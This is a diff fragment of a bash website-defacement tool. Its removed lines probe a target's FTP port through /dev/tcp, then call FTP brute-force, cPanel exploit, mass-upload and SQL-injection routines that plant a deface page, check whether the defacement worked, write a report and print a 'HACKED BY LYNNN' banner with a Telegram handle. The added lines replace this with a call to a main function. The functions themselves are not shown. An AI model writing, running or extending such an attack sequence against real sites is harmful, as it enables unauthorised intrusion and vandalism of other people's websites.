-# FTP check
-timeout 2 bash -c "echo >/dev/tcp/$IP/21" 2>/dev/null
-FTP_CHECK=$?
-
-# Start exploits
-echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
-echo -e "${RED}║         STARTING EXPLOIT SEQUENCE             ║${NC}"
-echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
-
-# FTP Brute Force
-ftp_brute "$IP" "LYNNN.html"
-
-# cPanel Exploit
-cpanel_exploit "$IP" "LYNNN.html"
-
-# Mass Upload
-mass_upload "$TARGET" "$IP" "LYNNN.html"
-
-# SQL Injection
-sql_upload "$TARGET" "LYNNN.html"
-
-# Verify
-verify_deface "$TARGET" "$IP"
-VERIFY_RESULT=$?
-
-# Generate report
-if [ $VERIFY_RESULT -eq 0 ]; then
-    generate_report "$TARGET" "$IP" "SUCCESS"
-else
-    generate_report "$TARGET" "$IP" "FAILED"
-fi
-
-# Final message
-echo -e "\n${CYAN}╔══════════════════════════════════════════════════════════╗${NC}"
-echo -e "${CYAN}║     🔥  MISSION COMPLETE - HACKED BY LYNNN!!  🔥       ║${NC}"
-echo -e "${CYAN}╚══════════════════════════════════════════════════════════╝${NC}"
-echo -e "\n${GREEN}Files created:${NC}"
-echo "  📁 LYNNN.html - HTML Deface"
-echo "  📁 REPORT_LYNNN.txt - Report"
-echo "  📁 lynn_success.txt - Success log"
-echo -e "\n${YELLOW}Telegram: @lynnn046${NC}"
+# Jalankan main function
+main
